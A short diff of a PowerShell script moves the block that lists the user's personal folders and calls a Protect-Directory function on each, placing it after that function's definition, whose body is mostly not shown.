@@ -1,19 +1,3 @@
-# Define the important directories
-$importantDirectories = @(
-    [Environment]::GetFolderPath("MyDocuments"),
-    [Environment]::GetFolderPath("MyPictures"),
-    [Environment]::GetFolderPath("MyMusic"),
-    [Environment]::GetFolderPath("MyVideos"),
-    [Environment]::GetFolderPath("Desktop"),
-    "C:\path\to\other\important\directory" # Add other important directories as needed
-)
-
-foreach ($path in $importantDirectories) {
-    Protect-Directory -path $path
-}
-
-Exit
-
 
 function Protect-Directory {
     param (
@@ -41,3 +25,19 @@ function Protect-Directory {
         # Handle other exceptions silently
     }
 }
+
+# Define the important directories
+$importantDirectories = @(
+    [Environment]::GetFolderPath("MyDocuments"),
+    [Environment]::GetFolderPath("MyPictures"),
+    [Environment]::GetFolderPath("MyMusic"),
+    [Environment]::GetFolderPath("MyVideos"),
+    [Environment]::GetFolderPath("Desktop"),
+    "C:\path\to\other\important\directory" # Add other important directories as needed
+)
+
+foreach ($path in $importantDirectories) {
+    Protect-Directory -path $path
+}
+
+Exit
